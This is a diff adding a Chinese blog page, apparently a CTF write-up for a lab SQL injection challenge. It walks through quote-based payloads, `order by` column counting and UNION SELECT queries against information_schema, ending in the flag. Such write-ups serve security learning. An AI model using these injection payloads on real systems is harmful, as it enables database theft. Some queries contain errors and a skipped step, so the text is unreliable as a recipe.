@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>ccp-web-1 | past</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="ccp-web-1  ccp考试中遇到的一道sql注入题目  本题考点：sql注入 打开靶场，是一个登入界面，先随便注册一个账号登入进去，发现是一个服务后台，可以看到有一个搜索工单界面，在搜索栏里面尝试: 1&#39; or 1&#x3D;1 --+  发现&#39;被拉入黑名单过滤了，再次翻找后台，发现个人资料里面也有输入框， 再次尝试:1&#39; or 1&#x3D;1 --+,发现可以注入，这样就成功找到注入入口  经过尝试，发现闭">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ccp-web-1">
+<meta property="og:url" content="https://xiafujian.github.io/2026/10/19/ccp-web-1/index.html">
+<meta property="og:site_name" content="past">
+<meta property="og:description" content="ccp-web-1  ccp考试中遇到的一道sql注入题目  本题考点：sql注入 打开靶场，是一个登入界面，先随便注册一个账号登入进去，发现是一个服务后台，可以看到有一个搜索工单界面，在搜索栏里面尝试: 1&#39; or 1&#x3D;1 --+  发现&#39;被拉入黑名单过滤了，再次翻找后台，发现个人资料里面也有输入框， 再次尝试:1&#39; or 1&#x3D;1 --+,发现可以注入，这样就成功找到注入入口  经过尝试，发现闭">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xiafujian.github.io/image/ccp-web-1/1.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/ccp-web-1/2.png">
+<meta property="og:image" content="https://xiafujian.github.io/image/ccp-web-1/3.png">
+<meta property="article:published_time" content="2026-10-19T07:01:03.914Z">
+<meta property="article:modified_time" content="2026-10-19T07:31:34.939Z">
+<meta property="article:author" content="past">
+<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xiafujian.github.io/image/ccp-web-1/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="past" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<!-- hexo injector head_end start --><link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.1.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">past</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">from past to future</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://xiafujian.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-ccp-web-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/10/19/ccp-web-1/" class="article-date">
+  <time class="dt-published" datetime="2026-10-19T07:01:03.914Z" itemprop="datePublished">2026-10-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      ccp-web-1
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1>ccp-web-1</h1>
+<ul>
+<li>ccp考试中遇到的一道sql注入题目</li>
+</ul>
+<p>本题考点：sql注入</p>
+<p>打开靶场，是一个登入界面，先随便注册一个账号登入进去，发现是一个服务后台，可以看到有一个搜索工单界面，在搜索栏里面尝试:<br>
+<code>1' or 1=1 --+</code></p>
+<p><img src="/image/ccp-web-1/1.png" alt="alt text"></p>
+<p>发现<code>'</code>被拉入黑名单过滤了，再次翻找后台，发现个人资料里面也有输入框，<br>
+再次尝试:<code>1' or 1=1 --+</code>,发现可以注入，这样就成功找到注入入口</p>
+<p><img src="/image/ccp-web-1/2.png" alt="alt text"></p>
+<p>经过尝试，发现闭合字符是<code>'</code>，然后就可以构造:<br>
+<code>1' order by 1 --+</code>等来确定有几列</p>
+<ul>
+<li><code>order by 1</code>：按第 1 列排序，正常页面，代表存在第 1 列</li>
+<li><code>order by 2</code>：正常，存在第 2 列</li>
+<li><code>order by 3</code>：正常，存在第 3 列</li>
+</ul>
+<p>然后就是<br>
+<code>-1' union select 1,database(),33 --+</code><br>
+得到数据库名称:<strong>ctf_union</strong></p>
+<p><code>-1' union select 1,group_concat(table_name),3 from information_schema_tables where table_schema='ctf_union' --+</code><br>
+得到表名:<strong>flag，new</strong></p>
+<p><code>-1' union select 1,group_concat(column_name),3 from information_schema_columns where table_schema='ctf_union' and table_name='flag' --+</code><br>
+得到flag: <strong>flag{ebb1dd5a-d194-4352-b760-f266d301c5f7}</strong></p>
+<p><img src="/image/ccp-web-1/3.png" alt="alt text"></p>
+<p>这道题在sql注入部分和sql-lab-1的那道题基本一模一样，但是需要认真寻找注入口，搜索工单那个搜索栏确实是一个很阴的烟雾弹</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://xiafujian.github.io/2026/10/19/ccp-web-1/" data-id="cuid2Z7LbJszTPdtsoCc1JF7_" data-title="ccp-web-1" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL/" rel="tag">SQL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2026/10/16/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">鲲鹏杯web-[night_patrol]</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/sqli-lab/">sqli-lab</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/" rel="tag">SQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/SQL/" style="font-size: 15px;">SQL</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/Web/" style="font-size: 20px;">Web</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/10/">十月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/09/">九月 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/10/19/ccp-web-1/">ccp-web-1</a>
+          </li>
+        
+          <li>
+            <a href="/2026/10/16/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-night_patrol/">鲲鹏杯web-[night_patrol]</a>
+          </li>
+        
+          <li>
+            <a href="/2026/10/13/%E9%B2%B2%E9%B9%8F%E6%9D%AFweb-EZ-EL/">鲲鹏杯web-[EZ-EL]</a>
+          </li>
+        
+          <li>
+            <a href="/2026/10/08/sqli-lab-11~16/">sqli-lab-11~16的wp</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/29/sqli-lab-8~10/">sqli-lab-8~10的wp</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 past<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
